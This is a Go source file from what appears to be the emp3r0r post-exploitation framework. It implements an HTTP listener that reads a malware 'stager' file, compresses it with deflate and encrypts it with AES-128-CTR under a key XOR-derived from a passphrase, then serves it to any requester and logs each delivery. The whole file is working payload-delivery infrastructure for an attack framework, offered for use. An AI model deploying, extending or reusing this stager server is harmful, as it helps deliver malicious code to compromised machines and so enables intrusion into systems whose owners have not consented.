package listener

import (
	"bytes"
	"compress/flate"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

var server *http.Server

// encryptData encrypts the given data using the AES-128-CTR algorithm and the provided key.
// The IV is prepended to the encrypted data.
func encryptData(data []byte, key []byte) []byte {
	if len(key) != 16 {
		logging.Fatalf("Key length must be 16 bytes for AES-128-CTR")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		logging.Fatalf("Failed to create AES cipher: %v", err)
	}

	// Generate a random IV
	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		logging.Fatalf("Failed to generate IV: %v", err)
	}
	logging.Infof("Generated IV: %s", hex.EncodeToString(iv))

	// Use CTR mode for encryption
	stream := cipher.NewCTR(block, iv)

	encrypted := make([]byte, len(data))
	stream.XORKeyStream(encrypted, data)

	// Prepend the IV to the encrypted data
	return append(iv, encrypted...)
}

// compressData compresses the given data using raw deflate.
func compressData(data []byte) []byte {
	var b bytes.Buffer
	w, err := flate.NewWriter(&b, flate.BestCompression)
	if err != nil {
		logging.Fatalf("Failed to create deflate writer: %v", err)
	}
	_, err = w.Write(data)
	if err != nil {
		logging.Fatalf("Failed to compress data: %v", err)
	}
	w.Close()
	return b.Bytes()
}

// deriveKeyFromString derives a 16-byte key from a string.
// The key is derived by XORing the characters of the string.
func deriveKeyFromString(str string) []byte {
	key := make([]uint32, 4)
	for i := 0; i < 4; i++ {
		for j := 0; j < len(str)/4; j++ {
			key[i] ^= uint32(str[i+j*4]) << (j % 4 * 8)
		}
	}
	keyBytes := make([]byte, 16)
	for i, v := range key {
		binary.LittleEndian.PutUint32(keyBytes[i*4:], v)
	}
	logging.Infof("Derived key: %08x %08x %08x %08x\n", key[0], key[1], key[2], key[3])
	return keyBytes[:16] // Ensure the key is 16 bytes long
}

// serveStager serves the encrypted stager file over HTTP.
func serveStager(stager_enc []byte, port string) error {
	if server != nil {
		logging.Infof("Shutting down existing server on port %s", server.Addr)
		if err := server.Shutdown(context.TODO()); err != nil {
			logging.Infof("Error shutting down server: %v", err)
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		logging.Infof("Received request from %s", r.RemoteAddr)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(stager_enc)))
		w.Write(stager_enc)
		logging.Infof("Served encrypted stager to %s", r.RemoteAddr)
	})

	server = &http.Server{
		Addr:    fmt.Sprintf(":%s", port),
		Handler: mux,
	}

	logging.Infof("Starting HTTP server on port %s", port)
	return server.ListenAndServe()
}

// HTTPAESCompressedListener reads, compresses, encrypts the stager file and serves it over HTTP.
// stagerPath: the path to the stager file to serve.
// port: the port to serve the stager file on.
// keyStr: the passpharase to encrypt the stager file.
// loaderPath: optional path to stage1 loader (empty string if not used).
func HTTPAESCompressedListener(stagerPath string, port string, keyStr string, compression bool, loaderPath string) error {
	blob, err := buildServedBlob(stagerPath, keyStr, loaderPath, compression)
	if err != nil {
		return err
	}

	logging.Infof("Serving encrypted stager file on port %s", port)
	return serveStager(blob, port)
}

// HTTPBareListener serves the stager file over HTTP without any encryption or compression.
func HTTPBareListener(stagerPath string, port string) error {
	stager, err := os.ReadFile(stagerPath)
	if err != nil {
		return fmt.Errorf("failed to read stager file: %v", err)
	}

	logging.Infof("Serving stager file on port %s", port)
	return serveStager(stager, port)
}

// StopHTTP stops the HTTP server.
func StopHTTP() {
	if server != nil {
		logging.Infof("Shutting down HTTP server on %s", server.Addr)
		if err := server.Shutdown(context.TODO()); err != nil {
			logging.Infof("Error shutting down HTTP server: %v", err)
		}
		server = nil
	}
}
